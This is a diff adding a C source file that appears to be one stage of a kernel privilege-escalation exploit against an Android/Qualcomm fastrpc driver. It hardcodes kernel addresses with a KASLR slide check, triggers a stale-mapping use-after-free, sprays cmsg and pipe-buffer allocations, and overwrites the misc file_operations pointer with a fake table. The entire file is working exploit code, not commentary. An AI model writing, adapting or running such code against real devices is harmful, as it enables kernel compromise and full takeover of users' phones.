@@ -1,0 +1,187 @@
+#include "t870_bridge.h"
+
+#include "t870_cmsg_wave.h"
+#include "t870_detached_owner.h"
+#include "t870_pipe_wave.h"
+#include "t870_reclaim_layout.h"
+
+#include <errno.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define T870_DIRECT_MAP_BASE 0xffffffc000000000ULL
+#define T870_DIRECT_MAP_END 0xffffffc300000000ULL
+#define T870_VMEMMAP_START 0xffffffbf00000000ULL
+#define T870_VMEMMAP_END 0xffffffbf0c000000ULL
+#define T870_STATIC_MISC_FOPS_DIRECT 0xffffffc00338d1e8ULL
+#define T870_STATIC_ANON_PIPE_BUF_OPS 0xffffff8009e21e00ULL
+#define T870_MAX_SLIDE 0x001f0000ULL
+#define T870_FOPS_TABLE_OFF 0x2000ULL
+#define T870_ORDER3_SIZE 0x8000ULL
+
+struct t870_bridge_resources {
+    struct t870_cmsg_wave first;
+    struct t870_cmsg_wave second;
+    struct t870_pipe_wave pipes;
+    int first_prepared;
+    int second_prepared;
+    int pipes_prepared;
+};
+
+static int aligned_slide(uint64_t value, uint64_t base)
+{
+    uint64_t slide;
+
+    if (value < base)
+        return 0;
+    slide = value - base;
+    return slide <= T870_MAX_SLIDE && (slide & 0xffffU) == 0U;
+}
+
+static int validate_inputs(const struct t870_bridge_inputs *inputs)
+{
+    uint64_t direct_delta;
+    uint64_t expected_page;
+
+    if (inputs->payload_base < T870_DIRECT_MAP_BASE ||
+        inputs->payload_base + T870_ORDER3_SIZE > T870_DIRECT_MAP_END ||
+        (inputs->payload_base & (T870_ORDER3_SIZE - 1U)) != 0U)
+        return 0;
+    if (inputs->fake_fops != inputs->payload_base + T870_FOPS_TABLE_OFF)
+        return 0;
+    if (!aligned_slide(inputs->misc_fops_direct,
+                       T870_STATIC_MISC_FOPS_DIRECT) ||
+        (inputs->misc_fops_direct & 0xfffU) != 0x1e8U)
+        return 0;
+    if (!aligned_slide(inputs->anon_pipe_buf_ops,
+                       T870_STATIC_ANON_PIPE_BUF_OPS))
+        return 0;
+
+    direct_delta = inputs->misc_fops_direct - T870_DIRECT_MAP_BASE;
+    expected_page = T870_VMEMMAP_START +
+        ((direct_delta >> 12U) * 0x40U);
+    if (inputs->misc_fops_page != expected_page ||
+        inputs->misc_fops_page < T870_VMEMMAP_START ||
+        inputs->misc_fops_page >= T870_VMEMMAP_END)
+        return 0;
+    return 1;
+}
+
+static void clean_resources(struct t870_bridge_resources *resources)
+{
+    int saved_errno = errno;
+
+    if (resources->first_prepared)
+        t870_cmsg_wave_release(&resources->first);
+    if (resources->second_prepared)
+        t870_cmsg_wave_release(&resources->second);
+    if (resources->pipes_prepared)
+        t870_pipe_wave_release(&resources->pipes);
+    free(resources);
+    errno = saved_errno;
+}
+
+static int dirty_failure(struct t870_bridge_context *context,
+                         const char *stage)
+{
+    fprintf(stderr, "[-] bridge dirty failure stage=%s; retaining owner "
+            "resources and refusing retry\n", stage);
+    if (context->hooks.mark_nonretryable != NULL)
+        context->hooks.mark_nonretryable(context->hooks.opaque);
+    return T870_OWNER_DIRTY_FAILURE;
+}
+
+int t870_bridge_worker(void *opaque)
+{
+    struct t870_bridge_context *context = opaque;
+    struct t870_bridge_resources *resources;
+    unsigned char safe_map[T870_CMSG_CONTROL_SIZE];
+    unsigned char pipe_write[T870_CMSG_CONTROL_SIZE];
+    unsigned int count;
+    int arm_result;
+
+    if (context == NULL || !validate_inputs(&context->inputs) ||
+        context->hooks.arm_stale_map == NULL ||
+        context->hooks.release_stale_map == NULL ||
+        context->hooks.verify_original_route == NULL) {
+        fprintf(stderr, "[-] bridge input contract rejected\n");
+        return EINVAL;
+    }
+    resources = calloc(1, sizeof(*resources));
+    if (resources == NULL)
+        return ENOMEM;
+
+    t870_build_safe_map_control(safe_map);
+    t870_build_pipe_write_control(
+        pipe_write, context->inputs.misc_fops_page,
+        (uint32_t)(context->inputs.misc_fops_direct & 0xfffU),
+        context->inputs.anon_pipe_buf_ops);
+
+    if (t870_cmsg_wave_prepare(&resources->first, safe_map,
+                               "bridge-first") != 0)
+        goto clean_failure;
+    resources->first_prepared = 1;
+    if (t870_cmsg_wave_prepare(&resources->second, pipe_write,
+                               "bridge-second") != 0)
+        goto clean_failure;
+    resources->second_prepared = 1;
+    if (t870_pipe_wave_prepare(&resources->pipes, 0) != 0)
+        goto clean_failure;
+    resources->pipes_prepared = 1;
+
+    /* arm_stale_map() is the first non-recoverable kernel transition. */
+    arm_result = context->hooks.arm_stale_map(context->hooks.opaque);
+    if (arm_result == T870_OWNER_DIRTY_FAILURE)
+        return dirty_failure(context, "fastrpc-arm");
+    if (arm_result != 0)
+        goto clean_failure;
+    if (context->hooks.mark_nonretryable != NULL)
+        context->hooks.mark_nonretryable(context->hooks.opaque);
+
+    /* These allocations must occur after map B was unmapped. */
+    count = t870_cmsg_wave_start(&resources->first);
+    printf("[*] bridge first wave blocked=%u/%u\n", count,
+           T870_CMSG_WAVE_SENDERS);
+    if (count != T870_CMSG_WAVE_SENDERS)
+        return dirty_failure(context, "first-wave");
+
+    if (context->hooks.release_stale_map(context->hooks.opaque) != 0)
+        return dirty_failure(context, "fastrpc-release");
+
+    count = t870_pipe_wave_populate(&resources->pipes, 3U);
+    printf("[*] bridge pipe arrays populated=%u/%u\n", count,
+           T870_PIPE_WAVE_COUNT);
+    if (count != T870_PIPE_WAVE_COUNT)
+        return dirty_failure(context, "pipe-populate");
+
+    /* Delayed sock_kfree_s now frees the one live replacement pipe array. */
+    t870_cmsg_wave_release(&resources->first);
+    resources->first_prepared = 0;
+
+    count = t870_cmsg_wave_start(&resources->second);
+    printf("[*] bridge second wave blocked=%u/%u\n", count,
+           T870_CMSG_WAVE_SENDERS);
+    if (count != T870_CMSG_WAVE_SENDERS)
+        return dirty_failure(context, "second-wave");
+
+    count = t870_pipe_wave_write_all(
+        &resources->pipes, &context->inputs.fake_fops,
+        sizeof(context->inputs.fake_fops));
+    printf("[*] bridge fake-fops write attempts=%u/%u target=%016" PRIx64
+           " value=%016" PRIx64 "\n", count, T870_PIPE_WAVE_COUNT,
+           context->inputs.misc_fops_direct, context->inputs.fake_fops);
+    if (count != T870_PIPE_WAVE_COUNT)
+        return dirty_failure(context, "write-all");
+
+    if (!context->hooks.verify_original_route(context->hooks.opaque))
+        return dirty_failure(context, "original-route-verification");
+
+    puts("[+] bridge original route verified; retaining second wave and "
+         "pipe descriptors");
+    return 0;
+
+clean_failure:
+    clean_resources(resources);
+    return errno != 0 && errno < T870_OWNER_DIRTY_FAILURE ? errno : EIO;
+}
